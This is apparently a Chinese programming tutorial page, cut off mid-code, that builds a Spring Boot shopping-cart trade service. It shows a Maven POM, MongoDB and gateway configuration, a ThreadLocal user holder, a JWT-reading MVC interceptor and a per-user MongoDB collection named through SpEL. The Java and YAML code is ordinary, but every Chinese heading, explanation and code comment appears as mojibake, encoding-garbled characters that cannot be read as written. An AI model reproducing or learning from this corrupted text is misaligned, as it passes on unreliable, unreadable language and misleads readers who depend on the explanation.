<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022705.png" alt="image-20200322213005912"></p>
<p>ä½ç½®ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022706.png" alt="image-20200322213015331"></p>
<h3 id="pomä¾èµ–"><a href="#pomä¾èµ–" class="headerlink" title="pomä¾èµ–"></a>pomä¾èµ–</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>leyou<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.leyou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ly-trade<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--webä¾èµ–--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--eureka--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--common--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.leyou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ly-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--mongoDBçš„starter--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-mongodb<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>åœ¨application.ymlæ–‡ä»¶ä¸­æ·»åŠ ä¸‹é¢å†…å®¹ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8087</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">trade-service</span></span><br><span class="line">  <span class="attr">data:</span></span><br><span class="line">    <span class="attr">mongodb:</span></span><br><span class="line">      <span class="attr">uri:</span> <span class="string">mongodb://leyou:123@ly-mongo/carts</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://ly-registry:10086/eureka</span></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">com.leyou:</span> <span class="string">debug</span></span><br></pre></td></tr></table></figure>

<h3 id="å¯åŠ¨ç±»"><a href="#å¯åŠ¨ç±»" class="headerlink" title="å¯åŠ¨ç±»"></a>å¯åŠ¨ç±»</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication(scanBasePackages = &#123;&quot;com.leyou.trade&quot;, &quot;com.leyou.common.advice&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LyTradeApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(LyTradeApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç½‘å…³è·¯ç”±"><a href="#ç½‘å…³è·¯ç”±" class="headerlink" title="ç½‘å…³è·¯ç”±"></a>ç½‘å…³è·¯ç”±</h3><p>åœ¨<code>ly-gateway</code>ä¸­çš„<code>application.yml</code>æ–‡ä»¶ä¸­æ·»åŠ è·¯ç”±ï¼š</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ly-gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="comment"># ...</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">	  <span class="comment"># ...</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">trade-service</span> <span class="comment"># äº¤æ˜“æœåŠ¡</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">lb://trade-service</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Path=/trade/**</span></span><br></pre></td></tr></table></figure>



<h2 id="å·²ç™»å½•è´­ç‰©è½¦"><a href="#å·²ç™»å½•è´­ç‰©è½¦" class="headerlink" title="å·²ç™»å½•è´­ç‰©è½¦"></a>å·²ç™»å½•è´­ç‰©è½¦</h2><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å®Œæˆå·²ç™»å½•è´­ç‰©è½¦ã€‚</p>
<h3 id="æ•°æ®ç»“æ„åˆ†æ"><a href="#æ•°æ®ç»“æ„åˆ†æ" class="headerlink" title="æ•°æ®ç»“æ„åˆ†æ"></a>æ•°æ®ç»“æ„åˆ†æ</h3><p>å·²ç™»å½•è´­ç‰©è½¦ä¼šå­˜å…¥MongoDBï¼Œé‚£ä¹ˆä»¥æ€æ ·çš„å½¢å¼å­˜å‚¨å‘¢ï¼Ÿ</p>
<p>å°†æ¥æˆ‘ä»¬ä¼šæœ‰å¾ˆå¤šçš„ç”¨æˆ·ï¼Œæ¯ä¸ªç”¨æˆ·è´­ç‰©è½¦ä¸­éƒ½ä¼šæ”¶è—å¾ˆå¤šå•†å“ä¿¡æ¯ï¼Œå°†æ¥å¯ä»¥å¯¹å…¶ä¸­çš„å•†å“è¿›è¡Œå¢åˆ æ”¹æŸ¥æ“ä½œï¼Œå› æ­¤æˆ‘ä»¬æ•°æ®å­˜å‚¨å¿…é¡»æ»¡è¶³çš„éœ€æ±‚åŒ…æ‹¬ï¼š</p>
<ul>
<li>å¿«é€Ÿæ ¹æ®ç”¨æˆ·æ‰¾åˆ°å¯¹åº”çš„è´­ç‰©è½¦</li>
<li>åœ¨ç”¨æˆ·è´­ç‰©è½¦ä¸­å¿«é€Ÿå®šä½æŸä¸ªå•†å“</li>
</ul>
<p>MongoDBæœ‰é›†åˆçš„æ¦‚å¿µï¼Œä¸€ä¸ªé›†åˆä¸­å¯ä»¥åŒ…å«å¾ˆå¤šä¸ªæ–‡æ¡£ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿™æ ·ï¼š</p>
<ul>
<li>ä¸º<strong>æ¯ä¸ªç”¨æˆ·åˆ›å»ºä¸€ä¸ªé›†åˆï¼Œä½œä¸ºè¿™ä¸ªç”¨æˆ·çš„è´­ç‰©è½¦</strong>ï¼Œç”¨æˆ·idä½œä¸ºé›†åˆåä¸€éƒ¨åˆ†</li>
<li>é›†åˆä¸­<strong>æ–‡æ¡£æ˜¯è´­ç‰©è½¦ä¸­çš„å•†å“å¯¹è±¡</strong>ï¼Œå¹¶ä¸”<strong>ä¸ºå•†å“idå»ºç«‹ç´¢å¼•</strong>ï¼Œæ–¹ä¾¿æŸ¥æ‰¾å•†å“ã€‚</li>
</ul>
<p>å½“ç„¶ï¼Œè´­ç‰©è½¦ä¸­çš„å•†å“ä¿¡æ¯éœ€è¦ä¸€ä¸ªå®ä½“ç±»æ¥è¡¨ç¤ºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.annotation.Id;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.mongodb.core.mapping.Document;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartItem</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long skuId;<span class="comment">// å•†å“id</span></span><br><span class="line">    <span class="keyword">private</span> String title;<span class="comment">// æ ‡é¢˜</span></span><br><span class="line">    <span class="keyword">private</span> String image;<span class="comment">// å›¾ç‰‡</span></span><br><span class="line">    <span class="keyword">private</span> Long price;<span class="comment">// åŠ å…¥è´­ç‰©è½¦æ—¶çš„ä»·æ ¼</span></span><br><span class="line">    <span class="keyword">private</span> Integer num;<span class="comment">// è´­ä¹°æ•°é‡</span></span><br><span class="line">    <span class="keyword">private</span> String spec;<span class="comment">// å•†å“è§„æ ¼å‚æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="è·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯"><a href="#è·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="è·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯"></a>è·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯</h3><p>æ—¢ç„¶è¦æŠŠç”¨æˆ·idä½œä¸ºé›†åˆåç§°ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°±å¿…é¡»æƒ³åŠæ³•åœ¨è¯·æ±‚è¿›å…¥äº¤æ˜“æœåŠ¡æ—¶å°±è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œå¹¶ä¸”å°†å½“å‰ç”¨æˆ·ä¿¡æ¯ä¸å½“å‰è¯·æ±‚çº¿ç¨‹ç»‘å®šã€‚</p>
<p>å…¶ä¸­æœ‰ä¸¤ä¸ªäº‹æƒ…éœ€è¦æˆ‘ä»¬å»æ€è€ƒï¼š</p>
<ul>
<li>å¦‚ä½•åœ¨è¯·æ±‚è¿›å…¥åè·å–ç™»å½•ç”¨æˆ·ä¿¡æ¯</li>
<li>å¦‚ä½•å°†ç”¨æˆ·ä¿¡æ¯ä¸å½“å‰è¯·æ±‚çº¿ç¨‹ç»‘å®š</li>
</ul>
<h4 id="è·å–ç”¨æˆ·æ€è·¯åˆ†æ"><a href="#è·å–ç”¨æˆ·æ€è·¯åˆ†æ" class="headerlink" title="è·å–ç”¨æˆ·æ€è·¯åˆ†æ"></a>è·å–ç”¨æˆ·æ€è·¯åˆ†æ</h4><p>è¦è·å–ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p>
<ul>
<li>æ–¹å¼ä¸€ï¼šé¡µé¢ç›´æ¥æŠŠç”¨æˆ·ä½œä¸ºè¯·æ±‚å‚æ•°ä¼ é€’<ul>
<li>ä¼˜ç‚¹ï¼šç®€å•ï¼Œæ–¹ä¾¿ï¼Œä»£ç é‡ä¸º0</li>
<li>ç¼ºç‚¹ï¼šä¸å®‰å…¨ï¼Œå› ä¸ºè°ƒç”¨è´­ç‰©è½¦CRUDçš„è¯·æ±‚æ˜¯ä»é¡µé¢å‘è¿‡æ¥çš„ï¼Œæˆ‘ä»¬ä¸èƒ½ç¡®å®šè¿™ä¸ªä¼ é€’æ¥çš„idæ˜¯ä¸æ˜¯çœŸçš„æ˜¯ç”¨æˆ·çš„id</li>
</ul>
</li>
<li>æ–¹å¼äºŒï¼šè‡ªå·±ä»cookieçš„tokenä¸­è§£æç”¨æˆ·ä¿¡æ¯<ul>
<li>ä¼˜ç‚¹ï¼šå®‰å…¨</li>
<li>ç¼ºç‚¹ï¼š<ul>
<li>éœ€è¦é‡å¤æ ¡éªŒJWTï¼Œå·²ç»åœ¨ç½‘å…³ä¸­åšè¿‡äº†</li>
<li>ä»£ç éº»çƒ¦</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>å®‰å…¨ç¬¬ä¸€ï¼Œæˆ‘ä»¬é€‰æ‹©æ–¹å¼äºŒï¼Œå¦‚ä½•è§£å†³é‡å¤æ ¡éªŒçš„é—®é¢˜å‘¢ï¼Ÿæˆ‘ä»¬å¾®æœåŠ¡å†…éƒ¨å¯ä»¥åªè§£æç”¨æˆ·ä¿¡æ¯ï¼ŒJWTçš„å®‰å…¨æ ¡éªŒã€‚</p>
<p>ä¸ºäº†åœ¨è¯·æ±‚è¿›å…¥æœåŠ¡åç›´æ¥èƒ½æ‹¿åˆ°ç”¨æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥æ‹¦æˆªæ¯ä¸€ä¸ªè¿›å…¥controllerçš„è¯·æ±‚ï¼Œç»Ÿä¸€å®Œæˆç™»å½•ç”¨æˆ·çš„è·å–ï¼Œè¿™ä¸ªæ‹¦æˆªå¯ä»¥é€šè¿‡SpringMVCçš„é€šç”¨æ‹¦æˆªå™¨ï¼šHandlerInterceptoræ¥å®ç°ã€‚</p>
<h4 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h4><p>å½“è·å–ç”¨æˆ·ä¿¡æ¯åï¼Œæˆ‘ä»¬éœ€è¦æŠŠç”¨æˆ·ä¿å­˜èµ·æ¥ï¼Œæ–¹ä¾¿åé¢çš„ä¸šåŠ¡ä½¿ç”¨ã€‚é‚£ä¹ˆä¿å­˜ç”¨æˆ·ä¿¡æ¯åˆ°å“ªé‡Œå‘¢ï¼Ÿ</p>
<p>æ¯æ¬¡è¯·æ±‚éƒ½æœ‰ä¸åŒçš„ç”¨æˆ·ä¿¡æ¯ï¼Œåœ¨å¹¶å‘è¯·æ±‚æƒ…å†µä¸‹ï¼Œå¿…é¡»ä¿è¯æ¯æ¬¡è¯·æ±‚ä¿å­˜çš„ç”¨æˆ·ä¿¡æ¯äº’ä¸å¹²æ‰°ï¼Œçº¿ç¨‹ç‹¬ç«‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œéœ€è¦æŠŠ<strong>ç”¨æˆ·ä¸æ¯ä¸€ä¸ªè¯·æ±‚çº¿ç¨‹ç»‘å®š</strong>ã€‚</p>
<p>æ³¨æ„ï¼šè¿™é‡Œä¸æ˜¯<strong>è§£å†³å¤šçº¿ç¨‹èµ„æºå…±äº«é—®é¢˜ï¼Œè€Œæ˜¯è¦ä¿è¯æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ç”¨æˆ·èµ„æºï¼Œäº’ä¸å¹²æ‰°</strong>ã€‚</p>
<p>è€ŒJDKä¸­æä¾›çš„<code>ThreadLocal</code>æ°å¥½æ»¡è¶³è¿™ä¸ªéœ€æ±‚ï¼Œé‚£ä¹ˆThreadLocalæ˜¯å¦‚ä½•å®ç°è¿™ä¸€éœ€æ±‚çš„å‘¢ï¼Ÿ</p>
<p>çœ‹ä¸‹è¿™å¹…å›¾ï¼š</p>
<p>  <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022707.png" alt="1554964371849"></p>
<p>å…³é”®ç‚¹ï¼š</p>
<ul>
<li>æ¯ä¸ªçº¿ç¨‹ï¼ˆ<code>Thread</code>ï¼‰å†…éƒ¨éƒ½æŒæœ‰ä¸€ä¸ª<code>ThreadLocalMap</code>å¯¹è±¡ã€‚</li>
<li><code>ThreadLocalMap</code>çš„Keyæ˜¯æŸä¸ª<code>ThreadLocal</code>å¯¹è±¡ï¼Œå€¼æ˜¯ä»»æ„Objectã€‚</li>
<li>ä¸åŒçº¿ç¨‹ï¼Œå†…éƒ¨æœ‰è‡ªå·±çš„<code>ThreadLocalMap</code>ï¼Œå› æ­¤å„çº¿ç¨‹èµ„æºäº’ç›¸ä¸ä¼šå¹²æ‰°ã€‚</li>
</ul>
<p>ä¸‹é¢æˆ‘ä»¬å®šä¹‰å®¹å™¨ï¼Œå­˜å‚¨ç”¨æˆ·æ•°æ®ã€‚åœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.utils</code>åŒ…ä¸­ï¼Œå®šä¹‰ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.utils;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserHolder</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;Long&gt; TL = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setUser</span><span class="params">(Long userId)</span> &#123;</span><br><span class="line">        TL.set(userId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Long <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Long</span> <span class="variable">id</span> <span class="operator">=</span> TL.get();</span><br><span class="line">        <span class="keyword">if</span>(id == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// ä¸å­˜åœ¨æ—¶è¿”å›é»˜è®¤å€¼</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">removeUser</span><span class="params">()</span> &#123;</span><br><span class="line">        TL.remove();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="mvcæ‹¦æˆªå™¨"><a href="#mvcæ‹¦æˆªå™¨" class="headerlink" title="mvcæ‹¦æˆªå™¨"></a>mvcæ‹¦æˆªå™¨</h4><p>æœ€åä¸€æ­¥ï¼Œå®šä¹‰SpringMVCçš„æ‹¦æˆªå™¨ï¼Œåœ¨æ‹¦æˆªå™¨ä¸­è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œå¹¶ä¿å­˜åˆ°ThreadLocalä¸­å³å¯ã€‚</p>
<p>åœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.interceptors</code>ä¸­å®šä¹‰æ‹¦æˆªå™¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.interceptors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exception.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.CookieUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.utils.UserHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.è·å–token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, UserTokenConstants.COOKIE_NAME);</span><br><span class="line">        <span class="comment">// 2.ä»tokenä¸­è§£æç”¨æˆ·</span></span><br><span class="line">        Payload&lt;UserInfo&gt; payload = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            payload = JwtUtils.getInfoFromToken(token, UserInfo.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;ç”¨æˆ·ä¸èƒ½ä¸ºç©º&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">        <span class="comment">// 3.ä¿å­˜ç”¨æˆ·</span></span><br><span class="line">        UserHolder.setUser(userInfo.getId());</span><br><span class="line">        <span class="comment">// 4.æ”¾è¡Œ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> &#123;</span><br><span class="line">        <span class="comment">// 5.æ¸…é™¤ç”¨æˆ·</span></span><br><span class="line">        UserHolder.removeUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åï¼Œåœ¨<code>ly-trade</code>çš„<code>com.leyou.trade.config</code>åŒ…ä¸­é…ç½®æ‹¦æˆªå™¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.interceptors.UserInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MvcConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">UserInterceptor</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="åŠ¨æ€é›†åˆåè¯"><a href="#åŠ¨æ€é›†åˆåè¯" class="headerlink" title="åŠ¨æ€é›†åˆåè¯"></a>åŠ¨æ€é›†åˆåè¯</h4><p>æˆ‘ä»¬è®¡åˆ’ä¸º<strong>æ¯ä¸ªç”¨æˆ·åˆ›å»ºä¸€ä¸ªé›†åˆï¼Œä½œä¸ºè¿™ä¸ªç”¨æˆ·çš„è´­ç‰©è½¦</strong>ï¼Œç”¨æˆ·idä½œä¸ºé›†åˆåä¸€éƒ¨åˆ†ã€‚è€Œé›†åˆåç§°æ˜¯é€šè¿‡æ³¨è§£åœ¨å®ä½“ç±»ä¸Šå£°æ˜çš„ï¼Œå¦‚ä½•æ‰èƒ½åœ¨æ³¨è§£ä¸­åŠ¨æ€è·å–å½“å‰ç”¨æˆ·çš„ä¿¡æ¯å‘¢ï¼Ÿ</p>
<p>SpringDataMongoDBä¸­çš„@Documentæ³¨è§£æ˜¯æ”¯æŒspELè¡¨è¾¾å¼çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡spELæ¥è°ƒç”¨UserHolderä¸­çš„æ–¹æ³•ï¼Œè·å–ç”¨æˆ·ä¿¡æ¯ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.annotation.Id;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.mongodb.core.mapping.Document;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Document(collection = &quot;cart_user_#&#123;T(com.leyou.trade.utils.UserHolder).getUser()&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartItem</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> Long skuId;<span class="comment">// å•†å“id</span></span><br><span class="line">    <span class="keyword">private</span> String 